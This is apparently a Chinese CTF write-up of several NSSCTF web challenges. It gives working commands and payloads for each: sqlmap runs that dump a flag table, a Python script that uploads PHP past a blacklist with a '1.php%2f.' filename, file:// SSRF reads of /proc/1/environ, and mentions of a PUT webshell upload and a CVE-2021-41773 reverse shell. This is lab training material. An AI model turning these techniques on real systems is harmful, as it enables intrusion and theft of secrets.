#### NSSCTF Round #1

##### basic_check

题目：https://www.nssctf.cn/problem/2199

一个页面内什么都没有，先扫一下目录和可用的请求类型。使用curl的具体命令为：

```shell
curl -X OPTIONS http://example.com -i
```

这道题支持PUT请求

> PUT请求如果URI不存在，则要求服务器根据**请求创建资源**，如果存在，服务器就接受请求内容，并修改URI资源的原始版本。

所以我们可以通过PUT请求传一个一句话木马即可拿到访问权限。

##### sql_by_sql

题目：https://www.nssctf.cn/problem/2200

参考：https://www.cnblogs.com/jackie-lee/p/16124022.html

发现可以注册用户，考虑二次注入。先注册一个amin' --+的恶意用户，再修改密码，这样admin的密码就被改成了我们的输入。在主页发现注入点，需要使用布尔盲注，尝试sqlmap自动化解决。一开始没注成功，把level提高到3成功了。POC如下：

```shell
sqlmap -u "http://node4.anna.nssctf.cn:28513/query" --data="id=1" --cookie="eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zh_m3A.vY-jEXuLAZ9uIGSW8wEm11mOABc" --level 3
// 这里的链接：/query data：id=1和cookie的内容用burp抓包就可以看到，即为sqlmap找到正确的注入点
sqlmap -u "http://node4.anna.nssctf.cn:28513/query" --data="id=1" --cookie="eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zh_m3A.vY-jEXuLAZ9uIGSW8wEm11mOABc" --tables
// 这里是确定注入点后使用--tables参数让sqlmap读取数据库的表名
sqlmap -u http://node4.anna.nssctf.cn:28513/query --data="id=1" --cookie="eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zh_m3A.vY-jEXuLAZ9uIGSW8wEm11mOABc" -T "flag" --columns
// 这里用-T指定数据表后使用--columns参数让sqlmap读取数据库的列名
sqlmap -u http://node4.anna.nssctf.cn:28513/query --data="id=1" --cookie="eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zh_m3A.vY-jEXuLAZ9uIGSW8wEm11mOABc" -T "flag" -C "flag" --dump
// 这里打印flag表flag列的内容，得到flag
```

#### NSSCTF 2nd

##### php签到

题目：https://www.nssctf.cn/problem/4280

参考：https://www.anquanke.com/post/id/253383

一道有黑名单的文件上传题，php和phtml肯定是不能直接上传的，考虑文件解析漏洞，发现上传1.php/.可以实现绕过，解析原理应该是文件名提取是最后一个/和.的中间部分，文件后缀提取的是最后一个.后面的部分，但是在操作系统中这种文件名不符合规范，所以/.在传入成功之后会被删除，上传代码为

```python
import requests

url = "http://node5.anna.nssctf.cn:28295"
file_content = "<?php phpinfo();?>'"
file = {"file": ("1.php%2f.", file_content)}
response = requests.post(url, files=file)
print(response.text)
```

之后访问1.php就可以查看phpinfo的内容，在其中找到flag。

##### MyBox

题目：https://www.nssctf.cn/problem/4299

可能是非预期解，直接用file读环境变量。

```php
?url=file:///start.sh		启动服务和设置环境变量的shell脚本，可以对靶机进行初始化，从中可以看到flag的写入位置
?url=file:///proc/1/environ
```

##### MyBox(revenge)

题目：https://www.nssctf.cn/problem/4306

参考：https://blog.csdn.net/Tauil/article/details/125946883

对MyBox的修复，一道[CVE-2021-41773](/CVE/CVE-2021-41773)的题目，首先用file协议查看app.py源代码，发现一个自定义的mybox，可以进行SSRF。这里使用[gopher](./assets/gopher.py)的攻击脚本，得到apache版本，满足CVE攻击方式，按照[脚本](./assets/MyBox.py)进行反弹shell，但是不知道什么原因无法反弹成功。

